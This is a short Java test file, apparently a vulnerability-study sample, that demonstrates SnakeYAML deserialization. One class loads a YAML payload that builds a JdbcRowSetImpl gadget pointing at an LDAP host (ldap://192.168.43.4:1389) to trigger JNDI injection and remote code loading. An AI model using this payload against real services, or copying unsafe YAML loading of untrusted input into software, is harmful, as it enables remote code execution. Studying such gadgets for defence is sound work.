package controller.vultest;

/**
 * @author: novy 
 * @date: 2021/3/5
 * @time: 16:06
 **/
import org.yaml.snakeyaml.Yaml;

public class YmlTest {
    public static void main(String[] args) {
        String normal ="hello novy";
        Yaml yaml =new Yaml();
        Object obj = yaml.load(normal);
        System.out.println(obj);
    }
}
//jndi注入
class mYml {
    public static void main(String[] args) {
        String mevil = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://192.168.43.4:1389/o=reference', autoCommit: true}";
        Yaml yaml = new Yaml();
        Object obj = yaml.load(mevil);
        System.out.println(obj);
    }
}
//从例子查看直观结果
class Test1{
    public static void main(String[] args) {
        Yaml yaml = new Yaml();
        TestImpl test = new TestImpl();
        test.name="novy";
        test.length=24;
        String dump = yaml.dump(test);
        System.out.println(dump);
    }
}
